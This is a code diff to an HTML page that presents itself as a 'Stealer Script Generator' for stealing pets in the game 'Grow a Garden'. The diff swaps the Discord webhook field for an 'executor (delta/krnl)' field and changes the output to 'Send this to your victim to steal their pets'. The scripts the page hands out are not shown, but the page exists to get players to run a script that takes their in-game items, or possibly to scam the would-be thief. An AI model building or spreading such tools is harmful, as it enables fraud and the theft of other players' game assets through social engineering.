@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Gaming Script Generator</title>
+  <title>Grow a Garden Pet Stealer Script Generator</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     body {
@@ -81,8 +81,8 @@
 <body>
   <div class="container">
     <h2>⚡ Stealer Script Generator ⚡</h2>
-    <input type="text" id="username" placeholder="Enter Username">
-    <input type="text" id="webhook" placeholder="Enter Discord Webhook URL (required)">
+    <input type="text" id="username" placeholder="username pets getter">
+    <input type="text" id="webhook" placeholder="executor (delta/krnl or others)">
     <button onclick="generateScript()">Generate Script</button>
     <div id="result"></div>
   </div>
@@ -108,7 +108,7 @@
       
       setTimeout(() => {
         const chosen = scripts[Math.floor(Math.random() * scripts.length)];
-        result.innerHTML = `✅ Generated for <b>${username}</b>:<br><code>${chosen}</code>`;
+        result.innerHTML = `✅ Send this to your victim to steal their pets <b>${username}</b>:<br><code>${chosen}</code><br><br><h1>Check here if someone used your stealer script</h1>`;
       }, 3000);
     }
   </script>
